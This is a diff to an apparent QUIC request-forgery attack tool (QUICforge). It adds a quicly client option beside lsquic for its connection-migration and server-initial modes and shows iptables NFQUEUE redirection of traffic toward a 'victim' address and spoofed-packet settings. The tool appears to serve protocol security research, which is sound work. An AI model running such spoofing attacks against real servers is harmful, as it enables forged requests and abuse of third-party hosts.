@@ -50,10 +50,12 @@ PACKET_COUNT = 0
 # Iptables Templates
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
 
-# Legacy Lsquic support, adjust to the correct install path
+# Legacy Lsquic and quicly support, adjust to the correct install path
 lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
 lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
 lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
+
+quicly_client_tmpl = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"
 
 def parse_arguments():
 
@@ -79,7 +81,7 @@ def parse_arguments():
     parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
     parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
     parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
-    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
+    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
     parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
     parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
     parser_cm._optionals.title = 'Optional Arguments'
@@ -95,7 +97,7 @@ def parse_arguments():
 
     #Parser for SIRF
     parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
-    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
+    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
     parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
     parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
     parser_si._optionals.title = 'Optional Arguments'
@@ -206,11 +208,17 @@ def configure_client(args):
 
 
 def configure_legacy_client(args):
-    cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
-    if args.version and args.version != '1':
-        cmd += lsquic_client_flag_version.format(version=args.version)     
-    if args.alpn and args.alpn != 'h3':
-        cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
+    
+    cmd = ""
+    if args.legacy == 'lsquic':
+        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
+        if args.version and args.version != '1':
+            cmd += lsquic_client_flag_version.format(version=args.version)     
+        if args.alpn and args.alpn != 'h3':
+            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
+    
+    if args.legacy == 'quicly':
+        cmd = quicly_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)
     
     print(cmd)
     return cmd
